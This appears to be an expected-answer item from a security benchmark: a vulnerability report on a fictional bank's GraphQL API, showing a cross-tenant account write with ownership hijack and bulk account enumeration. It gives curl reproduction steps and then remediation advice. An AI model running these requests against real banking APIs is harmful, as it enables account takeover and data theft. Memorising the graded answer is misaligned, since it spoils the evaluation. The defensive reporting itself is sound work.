# Expected Response

## System
- Domain: Financial Services / Retail Banking
- System: NexaBank Open Finance API
- Example ID: GQL-0052

## Priority Findings

### Finding 1: Cross-Tenant Write + Ownership Hijack on Bank Account via updateAccount (Pattern 1.9 — Batch/Bulk Endpoint BOLA Escalation)
**Severity:** Critical
**Category:** BOLA / Write Without Ownership Check

**Summary:**
The `updateAccount` mutation on `POST /graphql` accepts an arbitrary `accountId` without tenant ownership verification. An attacker from `tenant-89e2` targeted banking account `A-2052` belonging to `tenant-5fd4`, injecting `status: "approved"` and `ownerId: "attacker-89e25fd4"`. The response `200 OK` with `tenant-5fd4` data confirms the write succeeded. Per §5.0 (Pattern 1.9), the `bulkAccountLookup` mutation also accepts arbitrary account IDs without per-ID ownership filtering, enabling mass financial account enumeration across tenants.

**Evidence from HAR:**
- Request: `POST https://api.nexabank-open-financ.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-89e2` — attacker's identity
- Mutation payload: `updateAccount(id: "A-2052", input: {status: "approved", ownerId: "attacker-89e25fd4"})` — cross-tenant bank account write
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-5fd4`
- Response `ownerId`: `other-user-89e25fd4`
- Response `sensitiveField`: `CONFIDENTIAL-89e25fd4`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-89e25fd4`

**Root Cause (§4.0 RISK-GQL-052 + §5.0):** "`bulkAccountLookup` accepts a list of IDs without per-ID ownership checks. A single request can enumerate objects across all tenants." The same gap applies to `updateAccount`.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-052 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.9 | "`bulkAccountLookup` accepts IDs without per-ID ownership checks — enumerate across tenants" |
| HAR entry | request.postData | `updateAccount(id: "A-2052", input: {status: "approved", ownerId: "attacker-89e25fd4"})` |
| HAR entry | response.content | `tenantId: "tenant-5fd4"`, `200 OK` |

---

## Steps to Reproduce

### Step 1 — Cross-tenant account write (HAR attack)
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-89e2" \
  -d '{"query": "mutation { updateAccount(id: \"A-2052\", input: {status: \"approved\", ownerId: \"attacker-89e25fd4\"}) { accountId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `A-2052` (tenant-5fd4) updated to `approved`, ownerId hijacked.
**Secure outcome:** FORBIDDEN.

### Step 2 — Bulk cross-tenant account enumeration
```bash
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-89e2" \
  -d '{"query": "mutation { bulkAccountLookup(ids: [\"A-2052\", \"A-5fd4-002\", \"A-5fd4-003\"]) { accountId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns banking accounts from `tenant-5fd4` in bulk.

## Remediation
1. **Resolver tenant guard on updateAccount:** `WHERE account_id = $id AND tenant_id = $jwt.tenantId`.
2. **Strip ownerId from AccountInput.**
3. **Per-ID ownership filter in bulkAccountLookup:** Only return accounts where `tenant_id = $jwt.tenantId`.
4. **Redis cache key includes tenantId:** §2.0 caches by `accountId` only.
5. **Financial regulatory audit log:** All unauthorized account access attempts must be logged (PSD2/GDPR).
